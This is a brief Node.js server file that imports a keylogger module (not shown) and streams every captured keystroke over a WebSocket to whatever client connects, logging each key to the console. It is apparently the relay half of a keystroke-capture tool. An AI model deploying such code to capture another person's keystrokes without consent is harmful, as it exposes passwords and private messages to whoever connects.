import ArtyKeysLogger from "./ArtyKeylogger.js";
import express from "express";
import { Port } from "./Constants.js";
import http from "http";
import { WebSocketServer } from "ws";

const app = express();
const server = http.createServer(app);

const wss = new WebSocketServer({ server });

wss.on("connection", (ws) => {
  ArtyKeysLogger((key) => {
    console.log(`sending key ${key}`);
    return ws.send(key);
  });
});

server.listen(Port, () => {
  console.log(`server started at ${Port}`);
});
